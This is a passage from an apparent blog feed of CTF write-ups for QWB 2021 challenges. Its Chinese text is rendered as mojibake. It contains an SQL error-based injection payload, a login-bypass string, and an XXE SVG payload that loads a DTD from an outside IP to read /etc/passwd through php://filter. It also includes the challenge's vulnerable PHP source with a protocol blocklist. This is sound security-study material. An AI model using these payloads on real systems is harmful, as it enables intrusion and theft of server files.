&#125;;<br>&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure><p>ç„¶ååœ¨è‡ªå·±vpsä¸ŠæŒ‚ä¸Šexpï¼Œç”¨ç”µè¯è®¿é—®å³å¯ã€‚</p><p><img src="https://img-blog.csdnimg.cn/12c3f57885114411bfe1c4bf702f5ce7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç°åœ¨æ„Ÿè§‰å¯¹äºä¸€äº›æ¼æ´çš„å­¦ä¹ ï¼Œè¿˜æ˜¯å¾—æ³¨é‡ç†è§£åŸç†è€Œä¸æ˜¯ä»…ä»…æŠŠé¢˜åšå‡ºæ¥ï¼Œå›å¤´å†çœ‹CSRFå¾—æ¼æ´ç­‰ï¼Œå‘ç°ä»¥å‰å¯¹å®ƒå¾—ç†è§£è¿˜æ˜¯å¤ªæµ…äº†ï¼Œç»“åˆWebSocketç°åœ¨æ„Ÿè§‰ç†è§£æ›´æ·±äº†ï¼Œå¯¹äºç”¨æˆ·èº«ä»½å¾—ä¼ªé€ æ˜¯ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼Œä»»ä½•æ¼æ´éƒ½æœ‰ç€æ ¸å¿ƒçš„åˆ©ç”¨æ€æƒ³ï¼Œè¿™ä¸ªæ€æƒ³ä¹Ÿå¯ä»¥ç”¨åˆ°å…¶ä»–å¾—åœ°æ–¹ï¼Œåº”è¯¥å¤šæ³¨é‡è¿™äº›æ€æƒ³å¾—ç§¯ç´¯ï¼Œä»¥ååœ¨çœ‹åˆ°æŸäº›åè®®æˆ–è€…å¯åˆ©ç”¨æ¼æ´æ—¶ï¼Œåº”æ³¨é‡æ€è€ƒè¿™äº›æ¼æ´çš„æ€æƒ³åœ¨å“ªï¼Œèä¼šè´¯é€šæ‰æ˜¯æœ€é‡è¦çš„ã€‚</p><p>ä»Šå¤©å†æ¥ç€çœ‹çœ‹å¼ºç½‘æ¯hardxssçš„é¢„æœŸè§£ã€‚</p><h2 id="adnetwork"><a href="#adnetwork" class="headerlink" title="adnetwork"></a>adnetwork</h2><p>1337ä¸ªé‡å®šå‘ï¼Œç›´æ¥è„šæœ¬requestä¸€ä¸‹å°±è¡Œï¼Œå½“æ—¶æµè§ˆå™¨è¿æ°”å¥½éƒ½è·‘å‡ºæ¥äº†ã€‚ä¹Ÿå°±åªä¼šåšè¿™ä¸ªé¢˜äº†ã€‚</p><h2 id="Announcemen"><a href="#Announcemen" class="headerlink" title="Announcemen"></a>Announcemen</h2><p>æŠ¥é”™æ³¨å…¥ï¼ŒæŠ“åŒ…å‘ç°è¿˜è¦å¯¹emailè¿›è¡Œmd5åŸºæœ¬è¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">#<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;announcement&#x27;</span><br><br> #<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;logs&#x27;</span><br><br> #&quot;&#x27; or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or&#x27;&quot;<br></code></pre></div></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>æ„Ÿè§‰miscä¹ŸæŒºå¥½ç©çš„ï¼Œæ²¡æ€ä¹ˆäº†è§£miscï¼Œæš‘å‡è¶ç€å­¦å­¦misc</p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>å‰é¢å‡ å¼ å›¾å¯ä»¥ç›²çŒœï¼Œåˆ°æœ€åä¸€å¼ æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œéœ€è¦åˆ†å¸§gifæ‹¼å›¾ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;640.gif&#x27;</span>)<br><span class="hljs-comment"># p = []</span><br><span class="hljs-comment"># for i in range(9,88,3):</span><br><span class="hljs-comment">#     p.append(i)</span><br>flag = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">1080</span>, <span class="hljs-number">1080</span>), <span class="hljs-string">&quot;#FFFFFF&quot;</span>)<br>p = [<span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>, <span class="hljs-number">27</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">45</span>, <span class="hljs-number">48</span>, <span class="hljs-number">51</span>, <span class="hljs-number">54</span>, <span class="hljs-number">57</span>, <span class="hljs-number">60</span>, <span class="hljs-number">63</span>, <span class="hljs-number">66</span>, <span class="hljs-number">69</span>, <span class="hljs-number">72</span>, <span class="hljs-number">75</span>, <span class="hljs-number">78</span>, <span class="hljs-number">81</span>, <span class="hljs-number">84</span>, <span class="hljs-number">87</span>]<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    demo = <span class="hljs-string">&#x27;demo/&#x27;</span> + <span class="hljs-string">&#x27;640-&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.png&#x27;</span><br>    frame = Image.<span class="hljs-built_in">open</span>(demo)<br>    box = (<span class="hljs-number">0</span>, <span class="hljs-number">496</span>, <span class="hljs-number">1080</span>, <span class="hljs-number">517</span>)<br>    re = frame.crop(box)<br>    flag.paste(re,(<span class="hljs-number">0</span>,c*<span class="hljs-number">21</span>))<br>    c+=<span class="hljs-number">1</span><br>flag.show()<br><br></code></pre></div></td></tr></table></figure><p>Imageæ¨¡å—å‚è€ƒ<a href="https://www.cnblogs.com/tomyyyyy/p/11122814.html#:~:text=Image%E6%A8%A1%E5%9D%97%E6%98%AF%E5%9C%A8Python,PIL%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E5%9B%BE%E5%83%8F%E8%BF%9B%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8A%9F%E8%83%BD%E5%9F%BA%E6%9C%AC%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%8E%E6%AD%A4%E6%A8%A1%E5%9D%97%E5%86%85%E3%80%82">https://www.cnblogs.com/tomyyyyy/p/11122814.html#:~:text=Image%E6%A8%A1%E5%9D%97%E6%98%AF%E5%9C%A8Python,PIL%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E5%9B%BE%E5%83%8F%E8%BF%9B%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8A%9F%E8%83%BD%E5%9F%BA%E6%9C%AC%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%8E%E6%AD%A4%E6%A8%A1%E5%9D%97%E5%86%85%E3%80%82</a></p><h2 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h2><p>stegsolveæ‰“å¼€å·¦å³è°ƒé€šé“</p><p><img src="https://img-blog.csdnimg.cn/fabd3eaa5f5947538da8ade72471b3b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ…¢æ…¢è¯•25æ¬¡ã€‚</p><h2 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h2><p>çœ‹äº†wpï¼Œè¦ç”¨åˆ°MacroRecorderå·¥å…·ï¼Œåšmiscè¿˜æ˜¯å¾—æœç´¢å¼•æ“ç”¨çš„å¥½å‘€ï¼Œç™¾åº¦è¿˜æ˜¯ä¸å¤ªè¡Œã€‚å¯ä»¥æŸ¥åˆ°mrfæ–‡ä»¶æ ¼å¼å¤§è‡´æ˜¯ä¸€ä¸ªç”»å›¾ç”¨çš„ï¼Œé¼ æ ‡å®ç±»ä¼¼çš„ï¼Œä¸­é—´è¿˜æ•´çš„æœ‰è™šæ‹Ÿé”®ç›˜ï¼Œæ‰“å°å‡ºæ¥äº†ä¸€ä¸ªç½‘å€ï¼Œè¾“è¿›å»è¦å¯†ç ï¼Œä½†äº‹ä»¶æœ€åç»™äº†å¯†ç ï¼Œè¾“è¿›å»å°±å‡ºäº†ã€‚æ€è·¯æ˜¯è¿™æ ·ï¼Œå…³é”®è¿˜æ˜¯å¾—æ‰¾åˆ°é‚£ä¸ªå·¥å…·ï¼Œ</p><h3 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h3><p>è¿™é¢˜ç¤¾å·¥é¢˜äº†ï¼Œçœ‹çœ‹wpå°±è¡Œäº†ã€‚ã€‚</p><h2 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h2><h2 id="LX-100"><a href="#LX-100" class="headerlink" title="LX-100"></a>LX-100</h2><p>æ‰“å¼€æµé‡ï¼Œå…ˆçœ‹çœ‹å¸¸è§„çš„åè®®HTTPå•¥çš„</p><p><img src="https://img-blog.csdnimg.cn/d754955bca1a441a8ac7a7b50fae85bf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°·æ­Œå¯ä»¥æŸ¥åˆ°æ˜¯Lumix GX80 æ‘„åƒå¤´ï¼Œå…¶è§†é¢‘æµé€šè¿‡udpä¼ è¾“ã€‚æŠŠudpè¿½è¸ªæµdumpä¸‹æ¥ï¼ˆåŸå§‹æ•°æ®ï¼‰ç›´æ¥ä¿å­˜ä¸º<code>mjpeg</code>ï¼Œ<code>VLC media player</code>å°±èƒ½æ’­æ”¾ã€‚</p><p>æˆ–è€…å¯ä»¥å†™è„šæœ¬ï¼ŒåŸå§‹æ•°æ®æœ‰å¾ˆå¤šå›¾ç‰‡<code>FFD8</code>å¼€å¤´ï¼Œå°†æ¯å¼ å›¾æå–å‡ºæ¥ã€‚</p><h2 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h2><h2 id="Future-Tech"><a href="#Future-Tech" class="headerlink" title="Future Tech"></a>Future Tech</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWB_Hardxss</title>
    <link href="/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="QWB-Hardxss"><a href="#QWB-Hardxss" class="headerlink" title="QWB_Hardxss"></a>QWB_Hardxss</h1><p>è¿™é“é¢˜å±å®è¶…å‡ºäº†è‡ªå·±çš„çŸ¥è¯†èŒƒå›´ï¼Œå¾ˆå¤šä¸œè¥¿ä¸æ˜¯å¾ˆæ‡‚ï¼Œå‰å‡ å¤©å…ˆæŠŠXMLï¼ŒDTDçš„åŸºç¡€çŸ¥è¯†çœ‹äº†ä¸‹ï¼Œå†æ¥çœ‹è¿™é¢˜ï¼Œä½†è¿˜æ˜¯æœ‰äº›äº‘é‡Œé›¾é‡Œï¼Œå¤ªèœäº†ã€‚</p><p>å…¥æ‰‹åªæœ‰ç™»å½•å¯ä»¥è¿›å»ï¼Œç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå¾ˆæ˜æ˜¾å‘ç°ä¸€äº›æ³¨å…¥å…³é”®è¯è¢«è¿‡æ»¤æ‰äº†ï¼Œç„¶åè¯•è¯•ä¸‡èƒ½å¯†ç <code>admin&#39;or(1=1)#</code>æŠ“åŒ…å‘ç°è¿”å›äº†cookieï¼Œä½†è¿˜æ˜¯ç™»é™†ä¸ä¸Šã€‚</p><p><img src="https://img-blog.csdnimg.cn/0e82937ad3d8403292b8208410f70390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨jsä¸­æ‰‹åŠ¨è®¾ç½®cookie,<code>document.cookie=&quot;PHPSESSID=utf3df914s2ira67rnoeifom10&quot;</code></p><p>ç™»å½•æˆåŠŸåï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸Šä¼ ç•Œé¢</p><p><img src="https://img-blog.csdnimg.cn/60c4ef1ebc4443e4a7d0dce5ca7f0d85.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åå°±åªèƒ½å¯¹ç€WPåšäº†ï¼Œå› ä¸ºè‡ªå·±è¿˜æ²¡æ¥è§¦è¿‡XXEæ³¨å…¥ã€‚</p><p>æ ¹æ®ç™»å½•ç•Œé¢çš„æç¤º<code>å¤–éƒ¨å¼•ç”¨</code>ï¼Œ<code>çŸ¢é‡å›¾</code>ï¼Œåˆ™å¯ä»¥æƒ³åˆ°ä½¿ç”¨svgæ¥ä¸Šä¼ å›¾ç‰‡ï¼Œè¿›è¡ŒXXEæ³¨å…¥</p><p><img src="https://img-blog.csdnimg.cn/509ed1ee600344329a5a3ba36a62d433.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">secret</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">visit_hacker</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/xxe.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%visit_hacker;</span><br><span class="hljs-meta">%hacker;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hacker</span>&gt;</span><span class="hljs-symbol">&amp;sending;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hacker</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>1.phpä¸­ä¸º</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd&quot;</span>;<br><br></code></pre></div></td></tr></table></figure><p>xxe.dtdä¸­ä¸º</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">hacker</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY sending SYSTEM &#x27;%secret;&#x27;&gt;&quot;</span>&gt;</span> <br>è¿™ä¸ªåœ°æ–¹æœ€å¼€å§‹ä¸å°å¿ƒåœ¨secretå‰é¢åŠ äº†ä¸ª/ï¼Œä¸€ç›´æ²¡å‘ç°æµªè´¹äº†è´¼å¤šæ—¶é—´<br></code></pre></div></td></tr></table></figure><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯buuç¯å¢ƒçš„é—®é¢˜ï¼Œä¸Šä¼ çš„svgä¸€ç›´æ˜¾ç¤º<code>Not Image!</code>ã€‚ç›´æ¥æ‹¿wpè¯»å–åˆ°çš„æºç å…ˆçœ‹çœ‹å§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-comment">// ini_set(&quot;display_errors&quot;,&quot;off&quot;);</span><br><span class="hljs-comment">// error_reporting(0);</span><br><span class="hljs-keyword">if</span>(!array_key_exists(<span class="hljs-string">&quot;login&quot;</span>,<span class="hljs-variable">$_SESSION</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;login&quot;</span>]===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-variable">$encode</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$encode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)!=<span class="hljs-string">&quot;data:&quot;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You!Hacker!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$decode</span>=file_get_contents(<span class="hljs-variable">$encode</span>);<br><span class="hljs-comment">// var_dump($decode);</span><br><span class="hljs-keyword">if</span>(!(substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;\xFF\xD8&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;BM&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;\x89\x50&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;GI&quot;</span>))&#123;<br>    <span class="hljs-comment">// libxml_disable_entity_loader(true);</span><br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_DTDLOAD);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode1</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <span class="hljs-comment">// highlight_string($deocde1);</span><br>    <span class="hljs-comment">//é˜²æ­¢æœ¬åœ°æ–‡ä»¶è¯»å–</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file:|data:|zlib:|php:\/\/stdin|php:\/\/input|php:\/\/fd|php:\/\/memory|php:\/\/temp|expect:|ogg:|rar:|glob:|phar:|ftp:|ssh2:|bzip2:|zip:|ftps:/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;unsupport protocol: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\/var|\/etc|\.\.|\/proc/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal URI: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_NOENT);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <br>    <span class="hljs-comment">// highlight_string($decode);</span><br>    <span class="hljs-comment">//é˜²æ­¢xss</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/script|object|embed|onload\s*=/i&quot;</span>,<span class="hljs-variable">$decode</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no script!&quot;</span>);<br>    <span class="hljs-comment">// $encode=&quot;data:image/svg+xml;base64,&quot;.base64_encode($decode);</span><br>&#125;<br><span class="hljs-variable">$filename</span>=md5(rand());<br>file_put_contents(<span class="hljs-string">&quot;../upload/&quot;</span>.<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$decode</span>);<br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/upload/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$con</span>=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;select img from avatar where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;fetch_row())&#123;<br>        <span class="hljs-comment">// echo &quot;update avatar set img=&#x27;$filename&#x27; where userid=$_SESSION[login]&quot;;</span><br>        <span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;update avatar set img=&#x27;<span class="hljs-subst">$filename</span>&#x27; where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>!==<span class="hljs-literal">TRUE</span>)&#123;<br>            <span class="hljs-comment">// echo $con-&gt;error;</span><br>            <span class="hljs-variable">$con</span>-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;update success&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;insert into avatar values(<span class="hljs-subst">$_SESSION</span>[login],&#x27;<span class="hljs-subst">$filename</span>&#x27;)&quot;</span>);<br><span class="hljs-variable">$con</span>-&gt;commit();<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;upload success&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><p>å¯¹äºä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¹äºpngã€jpgã€bmpã€gifç›´æ¥è¯»æ–‡ä»¶å¤´è¯†åˆ«å‡ºæ¥åè½¬å­˜ï¼Œå¯¹äºå…¶ä»–æ–‡ä»¶å¤´çš„æŒ‰svgè¿›è¡Œè§£æï¼Œè§£æå¤±è´¥çš„è®¤ä¸ºä¸æ˜¯æœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶è¿”å›not imageã€‚å¹¶ä¸”å¯¹xmlè¿›è¡Œäº†ä¸¤æ¬¡ï¼ˆä¸æ˜¯ä¸¤æ­¥ï¼‰è§£æï¼Œç¬¬ä¸€æ¬¡è§£æçš„æ—¶å€™<code>loadxml(LIBXML_DTDLOAD)</code>ï¼Œæ²¡æœ‰LIBXML_DTDVAILDä¸ä¼šä»å‚æ•°å®ä½“æ–‡ä»¶è¯»å–å†…å®¹(%file ä¸ä¼šè¢«è¯»å…¥ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º)ï¼Œèƒ½å¤Ÿé˜²æ­¢è¢«æœ¬åœ°æ–‡ä»¶è¢«è¯»å–ï¼Œä¹Ÿèƒ½é˜²æ­¢jsè¢«å¤–éƒ¨å¼•å…¥ã€‚</p><p>è¿™ä¸ªè¦æ³¨æ„çš„æ˜¯å¤–å¸¦æ•°æ®çš„å¦‚æœæ˜¯å‚æ•°å®ä½“ï¼Œè¦æ³¨æ„ä½ æœåŠ¡å™¨è¿”å›çš„å¾—æ˜¯åˆæ³•çš„xmlæˆ–è€…ç©ºç™½ã€‚</p><h2 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h2><p>é€šè¿‡<code>serviceWorker</code>æ¥æˆªå–æµè§ˆå™¨çš„è¯·æ±‚ï¼Œå€Ÿé‰´äº†è¥¿æ¹–è®ºå‰‘çš„é‚£ä¸ªé¢˜è§£ï¼Œè¥¿æ¹–çš„é‚£ä¸ªé¢˜è§£ç°åœ¨æˆ‘ä¹Ÿçœ‹ä¸æ‡‚â€¦.</p><h3 id="Service-Workerç®€ä»‹"><a href="#Service-Workerç®€ä»‹" class="headerlink" title="Service Workerç®€ä»‹"></a>Service Workerç®€ä»‹</h3><ul><li>Appcacheç”¨æ¥å¤„ç†ç½‘ç«™çš„ç¦»çº¿ç¼“å­˜ï¼Œå¯ä»¥é€šè¿‡manifestæ–‡ä»¶æŒ‡å®šæµè§ˆå™¨ç¼“å­˜å“ªäº›æ–‡ä»¶ä»¥ä¾›ç¦»çº¿è®¿é—®ã€‚ä½†Appcacheæœ‰ç›¸å½“å¤šçš„ç¼ºé™·ï¼Œå¯¹äºæ•´ç«™ä¸­çš„å¤šé¡µç¼“å­˜æ¥è¯´æ”¯æŒæ¯”è¾ƒå·®ï¼Œè€ŒService Workerç”¨æ¥ä½œä¸ºå…¶æ›¿ä»£ã€‚</li><li>Service 